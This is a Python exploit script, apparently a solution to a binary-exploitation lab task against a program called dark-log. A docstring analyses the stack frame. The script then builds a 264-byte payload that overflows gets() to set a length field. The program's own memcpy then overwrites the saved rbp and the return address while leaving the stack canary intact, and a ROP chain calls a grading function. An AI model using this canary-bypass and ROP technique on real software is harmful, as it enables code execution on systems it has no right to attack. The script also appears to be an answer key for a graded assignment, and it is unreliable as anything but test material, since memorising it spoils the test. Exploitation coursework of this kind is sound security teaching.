#!/usr/bin/env python3
"""Task 4: bypass the stack canary of attack/dark-log.

From `objdump -d attack/dark-log`, input()'s frame is

    sub  $0x120,%rsp              ; struct log_frame at rbp-0x120
    mov  %fs:0x28,%rax
    mov  %rax,-0x8(%rbp)          ; canary at rbp-0x8
    movl $0x0,-0x20(%rbp)         ; f.len = 0
    gets(f.expression)            ; f.expression = rbp-0x120, 128 bytes
    mov  -0x20(%rbp),%eax         ; f.len  <-- attacker controlled
    lea  -0x120(%rbp),%rdx
    sub  $-0x80,%rdx              ; &f.logMsg = rbp-0xa0
    add  %rdx,%rax                ; dst = f.logMsg + f.len
    memcpy(dst, f.expression, 128)

so the struct sits at rbp-0x120:

    offset 0x000  f.expression[128]   <- gets() writes here (unbounded)
    offset 0x080  f.logMsg[128]
    offset 0x100  f.len               <- 4 bytes, we set it to 0xa0 = 160
    offset 0x104  f.pad[8]
    offset 0x110  (unused)
    offset 0x118  canary             <- must stay intact
    offset 0x120  saved rbp
    offset 0x128  return address

One single `gets` cannot get past the canary, so the exploit uses the two-step
copy the program performs *for* us:

  1. the first 264 input bytes fill expression+logMsg+len+pad (stopping 16
     bytes short of the canary, so the check still passes) and set
     f.len = 0xa0;
  2. memcpy(f.logMsg + 0xa0, f.expression, 128) = memcpy(rbp, expression, 128)
     copies our buffer *over* the saved rbp and the return address while
     leaving the canary at rbp-0x8 untouched.

The first 16 bytes of f.expression are therefore the new saved rbp + the first
return address, and the rest is a ROP chain identical in spirit to task 3
(dark-log also has `pop %rdi; ret` at 0x4018a3 and a bare `ret` at 0x4018a4).
"""
import sys

POP_RDI_RET = 0x4018A3      # 5f c3 inside __libc_csu_init's epilogue
RET         = 0x4018A4      # c3
GRADE_EVAL  = 0x401677
EXIT_PLT    = 0x0           # dark-log does not import exit; grade_eval already
                            # fflush()es stdout, so ending the chain with 0
                            # (=> SIGSEGV after the flag is written) is fine

def q(x):
    return x.to_bytes(8, "little")

# bytes 0..127 of the input: copied by memcpy to the area above the canary
chain  = q(0x4242424242424242)   # becomes saved rbp -> rbp+0
chain += q(POP_RDI_RET)          # rbp+8  : return address of input()
chain += q(4)                    # rbp+16 : -> edi = 4
chain += q(RET)                  # rbp+24 : alignment fixer
chain += q(GRADE_EVAL)           # rbp+32 : grade_eval(4)
chain += q(EXIT_PLT)             # rbp+40 : abort here, output is already flushed
chain += b"C" * (128 - len(chain))

payload  = chain                 # f.expression (also the memcpy source)
payload += b"D" * 128            # f.logMsg
payload += (0xA0).to_bytes(4, "little")   # f.len = 160 = 0xa0
payload += b"E" * 4              # f.pad (partial) -> total 264 < 280 (canary)

assert len(payload) == 264
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
